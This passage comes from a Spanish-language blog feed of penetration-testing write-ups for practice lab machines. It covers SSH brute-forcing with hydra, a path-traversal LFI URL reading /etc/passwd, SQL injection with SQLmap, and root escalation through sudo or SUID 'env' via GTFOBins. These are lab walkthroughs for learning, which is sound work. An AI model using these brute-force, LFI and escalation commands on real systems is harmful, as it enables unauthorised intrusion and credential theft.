+<p><img src="/imagenes/Pasted%20image%2020241121110059.png" alt="[Pasted image 20241121110059.png]" /></p>
+
+<p>vemos que encontramos un posible usuario “borazuwarah”</p>
+
+<p><img src="/imagenes/Pasted%20image%20202411211100154.png" alt="[Pasted image 20241121110154.png]" /></p>
+
+<p>encontramos un archivo secreto.txt lo leemos</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121110252.png" alt="[Pasted image 20241121110252.png]" /></p>
+
+<p>no encontramos nada asi que ya teniendo un posible usuario haremos fuerza bruta usando hydra para encontrar alguna contrasena</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121110349.png" alt="[Pasted image 20241121110349.png]" /></p>
+
+<p>encontramos una contrasena 123456 que usaremos para loguearnos mediante ssh</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121110549.png" alt="[Pasted image 20241121110549.png]" /></p>
+
+<p>listamos los directorios a los que podemos acceder con el comando <code class="language-plaintext highlighter-rouge">sudo-l</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121110657.png" alt="[Pasted image 20241121110657.png]" /></p>
+
+<p>vemos que podemos acceder a la ruta /bin/bash sin necesidad de una contrasena  nos hacemos root solo usando sudo mas la ruta</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121110820.png" alt="[Pasted image 20241121110820.png]" /></p>
+
+<p>listo somos root</p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[ejecutamos la maquina docker con los comandos]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">BreakMySsh</title><link href="http://localhost:4000/pentesting/2024/12/03/breakmyssh.html" rel="alternate" type="text/html" title="BreakMySsh" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/breakmyssh</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/breakmyssh.html"><![CDATA[<p>iniciamos las maquina</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121152326.png" alt="[Pasted image 20241121152326.png]" /></p>
+
+<p>escaneamos la ip en busca de puertos abiertos</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121152402.png" alt="[Pasted image 20241121152402.png]" /></p>
+
+<p>encontramos abierto el puerto 22 donde corre ssh en su version openssh 7.7 usamos searchsploit  para encontrar alguna vulneravilidad</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121152544.png" alt="[Pasted image 20241121152544.png]" /></p>
+
+<p>luego usamos metasploit para usar el sploit user enumeration buscamos en chatgpt cuales son los paramateros necesarios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121152737.png" alt="[Pasted image 20241121152737.png]" /></p>
+
+<p>uso una lista de usuarios de seclist</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121152859.png" alt="[Pasted image 20241121152859.png]" /></p>
+
+<p>y encontramos una lista de usuarios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121152932.png" alt="[Pasted image 20241121152932.png]" /></p>
+
+<p>salimos de mfsconsole y usamos hydra para encontrar una posible contrasena</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121153040.png" alt="[Pasted image 20241121153040.png]" /></p>
+
+<p>encontramos la contrasena para el usuario root</p>
+
+<p>y entramos por ssh y ya somos root</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121153150.png" alt="[Pasted image 20241121153150.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[iniciamos las maquina]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">BuscaLove</title><link href="http://localhost:4000/pentesting/2024/12/03/buscalove.html" rel="alternate" type="text/html" title="BuscaLove" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/buscalove</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/buscalove.html"><![CDATA[<p>iniciamos la maquina</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121181626.png" alt="[Pasted image 20241121181626.png]" /></p>
+
+<p>analizamos los puertos con nmap  <code class="language-plaintext highlighter-rouge">nmap -p- --open -sCVS -vvv -Pn -n --min-rate 5000 172.18.0.2</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121181701.png" alt="[Pasted image 20241121181701.png]" /></p>
+
+<p>buscamos directorios con gobuster <code class="language-plaintext highlighter-rouge">gobuster dir -u "172.18.0.2" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121181919.png" alt="[Pasted image 20241121181919.png]" /></p>
+
+<p>entramos al link http://172.18.0.2/wordpress/ y vemos el codigo fuente</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182104.png" alt="[Pasted image 20241121182104.png]" /></p>
+
+<p>se verifica que se ueda usar LfI http://172.18.0.2/wordpress/index.php?love=../../../../../../../../../../etc/passwd</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182234.png" alt="[Pasted image 20241121182234.png]" /></p>
+
+<p>encontramos dos usuarios pedro y rosa usamos hydra en cada uno para encontrar alguna contrasena la elegida es rosa
+<code class="language-plaintext highlighter-rouge">hydra -l rosa -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -s 22</code></p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182352.png" alt="[Pasted image 20241121182352.png]" /></p>
+
+<p>encontramos una contrasena para rosa y entramos mediante ssh</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182446.png" alt="[Pasted image 20241121182446.png]" /></p>
+
+<p>listamos los directorios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182516.png" alt="[Pasted image 20241121182516.png]" /></p>
+
+<p>listamos los directorios de root y encontramos un archivo secret.txt lo leemos y encontramos una cadena de carateres que analizamos usando chatgpt</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182629.png" alt="[Pasted image 20241121182629.png]" /></p>
+
+<p>con chatgpt descubrimos que esta en hex y posiblemente ascii o base 32 buscamos un decodificador online</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182839.png" alt="[Pasted image 20241121182839.png]" /></p>
+
+<p>y tenemos una contrasena noacertarasosi
+ probamos con el usurio pedro</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121182940.png" alt="[Pasted image 20241121182940.png]" /></p>
+
+<p>listamos los directorios y vemos que tenemos acceso a la dirrecion /usr/bin/env  con gtfobins encontramos como escalar privilegios</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121183102.png" alt="[Pasted image 20241121183102.png]" /></p>
+
+<p>usamos el comando <code class="language-plaintext highlighter-rouge">sudo /usr/bin/env /bin/sh</code> y listo somos root</p>
+
+<p><img src="/imagenes/Pasted%20image%2020241121183208.png" alt="[Pasted image 20241121183208.png]" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[iniciamos la maquina]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Injection</title><link href="http://localhost:4000/pentesting/2024/12/03/injection.html" rel="alternate" type="text/html" title="Injection" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/pentesting/2024/12/03/injection</id><content type="html" xml:base="http://localhost:4000/pentesting/2024/12/03/injection.html"><![CDATA[<p>Aquí va el contenido de tu entrada de blog. Puedes usar Markdown para formatear el texto, como en este ejemplo.</p>
+
+<p>Reconocimiento</p>
+
+<p>Realizaremos la primera fase del reconocimiento utilizando la herramienta Nmap, con los siguientes parámetros:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG AllPorts</code></p>
+
+<p>Realiza un escaneo rápido y detallado de todos los puertos abiertos en la IP 172.17.0.2 y guarda los resultados en AllPorts.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fe9cd33bf-9691-45b9-b9c6-a75de10eef45%2F64495610-ae30-45af-b567-38f62944ed7a%2FUntitled.png&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=d7f5f22e&amp;sv=1" alt="" /></p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FYRapHvMUeypvTU3l5SFb%252FCaptura%2520de%2520pantalla%25202024-06-22%2520110826.png%3Falt%3Dmedia%26token%3D2b5f064e-7cc5-4f6b-960d-efe5e9c3e674&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=2bcbe655&amp;sv=1" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -p22,80 172.17.0.2 -oN Targeted</code></p>
+
+<p>Usa la información del primer escaneo para ejecutar un escaneo detallado en los puertos 22 y 80, ejecutando scripts NSE y detectando versiones, guardando los resultados en un archivo de formato normal: Targeted.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FoUWMRt0CdyUmqfef7fyR%252FCaptura%2520de%2520pantalla%25202024-06-22%2520110839.png%3Falt%3Dmedia%26token%3D695a710e-c2df-4abc-9125-a6835a6634b6&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=9b2bd790&amp;sv=1" alt="" /></p>
+
+<p>El escaneo de Nmap revela que el host <code class="language-plaintext highlighter-rouge">172.17.0.2</code> tiene dos puertos abiertos:</p>
+
+<ul>
+  <li>
+    <p><strong>Puerto 22</strong> (SSH) ejecutando OpenSSH 8.9p1 en Ubuntu.</p>
+  </li>
+  <li>
+    <p><strong>Puerto 80</strong> (HTTP) ejecutando Apache httpd 2.4.52 en Ubuntu con una página de inicio de sesión y ciertas configuraciones de cookies no seguras.</p>
+  </li>
+</ul>
+
+<p>Esta información es útil para evaluar la seguridad y configuración de los servicios expuestos por el host.</p>
+
+<p>Realizaremos un análisis con WhatWeb, una herramienta de línea de comandos para identificar todas las tecnologías que están funcionando en el servicio HTTP expuesto, que corre en el puerto 80.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252Fbb1xHqUWRzsAsIFzLX1o%252FCaptura%2520de%2520pantalla%25202024-06-22%2520111237.png%3Falt%3Dmedia%26token%3De2baf3ac-57f0-4916-b1d7-d84b63454948&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=900c4cc&amp;sv=1" alt="" /></p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FGSozOBlDQft9vDQglHQY%252FCaptura%2520de%2520pantalla%25202024-06-22%2520112224.png%3Falt%3Dmedia%26token%3Ddc2c1efa-ae98-4e1a-a9f5-8739307b2eee&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=90d1da09&amp;sv=1" alt="" /></p>
+
+<p>Hemos encontrado un panel de inicio de sesión. Actualmente, no podemos acceder ya que no contamos con credenciales válidas. Hemos probado algunas combinaciones como admin:admin y admin:password, pero sin éxito.</p>
+
+<p>Usaremos la herramienta Gobuster para hacer fuerza bruta en los directorios. De este modo, podremos encontrar posibles rutas o vectores de entrada.</p>
+
+<p><code class="language-plaintext highlighter-rouge">gobuster dir -u</code> <a href="http://172.17.0.2"><code class="language-plaintext highlighter-rouge">http://172.17.0.2</code></a> <code class="language-plaintext highlighter-rouge">-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 200</code></p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FpkkoTlKqL6MK9cG2FSgQ%252FCaptura%2520de%2520pantalla%25202024-06-22%2520114207.png%3Falt%3Dmedia%26token%3De05b7139-1f3f-42ad-8431-8add1b9503ea&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=e0c53407&amp;sv=1" alt="" /></p>
+
+<p>Hemos encontrado una ruta /config.php que nos devuelve un código de estado 200. Al revisarla, solo encontramos una página en blanco sin nada en el código fuente.</p>
+
+<p>Regresamos al panel de inicio de sesión e intentamos forzar una inyección SQL.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252F3KvI6FxRqtnDu3DsVLrn%252FCaptura%2520de%2520pantalla%25202024-06-22%2520114628.png%3Falt%3Dmedia%26token%3D63955e1f-b6ba-4028-9474-3eb8ec380a7e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=dc97caaf&amp;sv=1" alt="" /></p>
+
+<p>Al intentar ingresar con una comilla simple (<code class="language-plaintext highlighter-rouge">'</code>) en el campo de nombre de usuario, recibí un error relacionado con la base de datos.</p>
+
+<p>¿Qué Significa Este Error?</p>
+
+<p>El hecho de que una comilla simple (<code class="language-plaintext highlighter-rouge">'</code>) cause un error indica una posible <strong>vulnerabilidad de inyección SQL</strong>. Este tipo de vulnerabilidad ocurre cuando una aplicación web no valida correctamente la entrada del usuario, permitiendo que fragmentos de código SQL maliciosos se inserten en las consultas de la base de datos.</p>
+
+<p>¿Por Qué Sucede?</p>
+
+<p>Cuando se introduce una comilla simple sin escapar, puede interrumpir la sintaxis de la consulta SQL, causando un error.</p>
+
+<p>Explotación</p>
+
+<p>Vamos a ejecutar y habilitar el proxy de Burp Suite para capturar la petición. De esta manera, podremos utilizar la herramienta SQLmap para automatizar el ataque.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252Fk2VD3XvMgPNr6nq2zxCG%252FCaptura%2520de%2520pantalla%25202024-06-22%2520115415.png%3Falt%3Dmedia%26token%3Deb6db499-6d47-47f0-85bc-c2bdf1ccf0d1&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=10ca2ee1&amp;sv=1" alt="" /></p>
+
+<p>Capturamos la solicitud generada por el método POST en el endpoint <code class="language-plaintext highlighter-rouge">/index.php</code>. Esta solicitud será utilizada con la herramienta SQLmap para automatizar el ataque.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FBK45Hu14nOQovcaAJ9UX%252FCaptura%2520de%2520pantalla%25202024-06-22%2520120218.png%3Falt%3Dmedia%26token%3D1f55b486-0664-44d3-bb69-98be2cb9c2f6&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=ea12df23&amp;sv=1" alt="" /></p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FRaKhMRR0JIMdskaRZwai%252FCaptura%2520de%2520pantalla%25202024-06-22%2520120305.png%3Falt%3Dmedia%26token%3Dc9a7ca8d-9e5e-442b-a47d-7a536cbdedac&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=66480913&amp;sv=1" alt="" /></p>
+
+<p>Hemos logrado extraer las tablas que contienen un nombre de usuario: <code class="language-plaintext highlighter-rouge">dylan</code> y una contraseña.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252F1QB1yWFyo7OzAFBstFun%252FCaptura%2520de%2520pantalla%25202024-06-22%2520120536.png%3Falt%3Dmedia%26token%3D678b57c6-67d6-4159-8983-df93b69b8064&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=6ad9b2f3&amp;sv=1" alt="" /></p>
+
+<p>La contraseña que encontramos también funciona con el servicio SSH expuesto en el puerto 22. Esto indica una reutilización de credenciales, lo que nos ha permitido ganar acceso a la máquina como el usuario Dylan.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252F2HKyexD4I8jhhRg2mQKB%252FCaptura%2520de%2520pantalla%25202024-06-22%2520120845.png%3Falt%3Dmedia%26token%3D52872d29-8460-45cd-a2e5-c72ebc0c574f&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=35b8cfde&amp;sv=1" alt="" /></p>
+
+<p>Al ejecutar el comando <code class="language-plaintext highlighter-rouge">sudo -l</code>, nos damos cuenta de que <code class="language-plaintext highlighter-rouge">sudo</code> no está disponible como comando. Por lo tanto, vamos a verificar los permisos SUID en busca de binarios que podamos aprovechar para escalar privilegios.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FTjSUfIp6ALuhUkHhGvL3%252FCaptura%2520de%2520pantalla%25202024-06-22%2520122244.png%3Falt%3Dmedia%26token%3D33f87959-629c-4374-be1a-b88c873e3e91&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=64e2a7fa&amp;sv=1" alt="" /></p>
+
+<p>Escalada de Privilegios</p>
+
+<p>El binario /usr/bin/env es una herramienta en Unix y Linux que se utiliza para ejecutar un programa en un entorno modificado. Si el binario /usr/bin/env tiene el bit SUID (Set User ID) activado, se ejecuta con los privilegios del propietario del archivo (generalmente root) en lugar del usuario que lo ejecuta. Cuando se ejecuta /usr/bin/env /bin/bash, si env tiene permisos SUID de root, el comando bash se ejecutará con privilegios de root, lo que permite al usuario escalar sus privilegios.</p>
+
+<p>Vamos a consultar nuestra fuente en <a href="https://gtfobins.github.io/gtfobins/env/">GTFOBins</a>, que nos indica cómo podemos escalar privilegios explotando el binario <code class="language-plaintext highlighter-rouge">env</code>.</p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FR7DaVtYDmBRwl9wADeqm%252FCaptura%2520de%2520pantalla%25202024-06-22%2520124057.png%3Falt%3Dmedia%26token%3De194dcef-d206-4228-be77-f29f8bed242b&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=a38c7a63&amp;sv=1" alt="" /></p>
+
+<p><img src="https://noon3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3606085230-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FPWDLdcZezaOSLXu6CIX6%252Fuploads%252FcbSFKKp5zYSm7eGsNApZ%252FCaptura%2520de%2520pantalla%25202024-06-22%2520122503.png%3Falt%3Dmedia%26token%3Dda9af4ca-ef54-4a11-b07a-8750c238c38e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=9e46ff8e&amp;sv=1" alt="" /></p>]]></content><author><name></name></author><category term="pentesting" /><summary type="html"><![CDATA[Aquí va el contenido de tu entrada de blog. Puedes usar Markdown para formatear el texto, como en este ejemplo.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/imagen.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/imagen.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
